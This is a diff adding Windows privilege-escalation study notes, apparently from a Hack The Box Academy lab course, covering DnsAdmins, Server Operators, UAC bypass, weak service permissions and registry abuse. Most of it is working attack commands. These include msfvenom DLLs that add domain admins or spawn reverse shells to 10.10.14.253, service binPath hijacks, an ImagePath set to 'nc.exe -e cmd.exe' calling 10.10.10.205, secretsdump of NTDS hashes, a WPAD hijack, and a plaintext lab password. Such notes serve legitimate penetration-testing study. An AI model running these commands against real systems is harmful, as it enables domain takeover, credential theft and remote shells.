@@ -367,7 +367,211 @@ We can also search security logs captured by WinEvent:
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
 
+## DnsAdmins
+
+All domain controllers are also DNS-servers, if our user is a DnsAdmin he is allowed to configure DNS on that server.
+
+A standard feature offers us to load any dll without verification.
+
+Fist generate a dll which adds our user to the domain admins:
+```
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+Transfer the dll to the target and run:
+
+```
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+```
+
+Then the service needs to be re-started (which is not something which is allowed by DnsAdmins)...
+
+We can check the permissions of our uses on a service with these commands:
+```
+wmic useraccount where name="netadm" get sid
+sc.exe sdshow DNS
+```
+(see https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
+
+If permitted we can start/stop the dns:
+```
+sc stop dns
+sc start dns
+```
+
+Next we can check if we are domain admins:
+```
+net group "Domain Admins" /dom
+```
+
+After confirming this worked we should remove the reg key as the DNS-server will not start with the current setting:
+```
+reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+```
 
 
+Another type of attack is creating a WPAD record where we modify to DNS so all trafic is routed to our attack box. Basically web browser will use WPAD entries to find the proxy server they need to use to route the traffic to... If we control the destination of this path all trafic is routed to our box.
+
+To do this execute following commands:
+```
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+```
+Then add the WPAD entry:
+```
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
+
+## Print operators
+
+If our uses is member of the print operator group we are allowed to load drivers. Drivers run in the kernel and have system level privileges. 
+We can load a malicious driven and then via a user land application retrieve its security token elevating us to system admin.
+
+See https://academy.hackthebox.com/module/67/section/605
+
+xfreerdp3 /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt!
+
+## Server Operators
+
+The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
+Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.
+
+We can check permission a group has on a service with the PsService tool from sysinternals:
+```
+c:\Tools\PsService.exe security AppReadiness
+....
+[ALLOW] BUILTIN\Server Operators
+                All
+```
+In this case we can see the Server Operators has all permission on this server.
+We can chaneg the binary path of the service to run a command which adds us to the Administrator group:
+```
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+Then we start the app:
+```
+sc start AppReadiness
+```
+It fails which is expected...
+But we should be admin now, which we can confirm with:
+```
+net localgroup Administrators
+```
+Now we can dump the NTDS.dit hashes:
+```
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+## User account control
+
+We can check if UAC is enabled with:
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+The UAC level we can check with:
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+
+There are quite a few bypassed documented here: https://github.com/hfiref0x/UACME
+These bypasses are OS version specific. We can check our OS-version with:
+```
+[environment]::OSVersion.Version
+```
+Our build 14393 has a flaw in the SystemPropertiesAdvanced.exe binary where it tries to import a non-existing dll `srrstr.dll` from a folder we control.
+Therefore we place a malicious dll there which spawns a reverse shell... The binary at hand is auto-elevating meaning we 
+essentially bypass UAC.
+
+First let's create the dll
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.253 LPORT=8443 -f dll > srrstr.dll
+```
+Setup a listener:
+```
+nc -nlvp 8443
+```
+
+Next just execute:
+```
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+We have more privileges now and have bypassed UAC.
+
+## Weak Permissions
+
+We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
+(https://github.com/GhostPack/SharpUp/)
+
+```
+.\SharpUp.exe audit
+```
+
+Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
+
+```
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Since we control the directory and can start/stop the service as a low-priviliged user we can replace the binary with a reverse shell:
+```
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+sc start SecurityService
+```
+
+Something else we can do is use `accesschk.exe` to check permission different groups/users have on the serivice (in this case the `WindscribeService` service)
+```
+accesschk.exe /accepteula -quvcw WindscribeService
+```
+
+If we have sufficient access we can change the `binPath` of the service to run an arbitrary command:
+```
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+```
+ 
+ ## Unquoted Service Path
+
+ When you don't double quote the service path Windows get confused and starts  shorter paths first, stopping as soon as it finds a valid executable.
+
+ For instance:
+ ```
+BINARY_PATH_NAME :
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+Windows would try (in that order):
+```
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\System.exe
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+We can look for services with unquoted service paths like this:
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+## Checking for Weak Service ACLs in Registry
+
+If due to weak ACLs we are allowed to change the registry related to a service we can for instance control the `imagePath` registry entry which defined the path to the executable windows runs when the service starts...
+
+Check to which services we have write access to the registry:
+```
+accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+```
+For instance if we see this output:
+```
+RW HKLM\System\CurrentControlSet\services\ModelManagerService
+    KEY_ALL_ACCESS
+```
+it means we can modify the registry... so we can do something like:
+```
+PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+## Modifiable Registry Autorun Binary
+
+We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.
+
+```
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+```
 
 
